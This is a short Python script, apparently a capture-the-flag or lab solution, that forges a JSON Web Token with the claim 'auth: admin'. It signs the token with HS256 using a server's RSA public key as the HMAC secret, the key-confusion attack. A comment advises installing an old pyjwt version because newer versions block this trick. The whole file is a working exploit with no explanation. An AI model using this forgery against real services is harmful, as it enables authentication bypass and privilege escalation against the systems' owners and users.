import jwt

# Newer versions of jwt prevent using asymmetic keys as an HMAC secret. Use an older version of pyjwt (such as 0.4.3) where the exception was yet to be implemented

f = open("publickey.pem", "r")
PUBLIC_KEY = f.read()

key = jwt.encode({"auth": "admin"}, PUBLIC_KEY, algorithm="HS256")
print(key)